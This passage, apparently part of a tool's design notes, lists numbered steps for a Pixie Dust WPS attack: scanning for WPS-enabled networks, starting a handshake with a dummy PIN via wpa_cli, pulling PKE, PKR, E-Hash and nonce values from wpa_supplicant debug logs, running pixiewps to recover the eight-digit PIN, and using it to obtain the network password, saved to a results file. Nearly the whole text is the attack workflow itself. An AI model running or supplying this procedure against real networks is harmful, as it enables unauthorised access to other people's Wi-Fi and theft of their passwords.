3. Start bundled wpa_supplicant with `-K -d` debug flags
4. `wpa_cli scan` + scan_results → identify WPS networks
5. For each WPS network:
   a. `wpa_cli wps_pin BSSID 12345670` → initiate handshake
   b. Parse wpa_supplicant log for crypto parameters (PKE, PKR, E-Hash1/2, AuthKey, E-Nonce)
   c. Run `pixiewps --pke --pkr --e-hash1 --e-hash2 --authkey --e-nonce`
   d. Extract 8-digit PIN from pixiewps output
   e. If PIN found, try it to get PSK
   f. Save to result.txt
6. Cleanup and restore WiFi
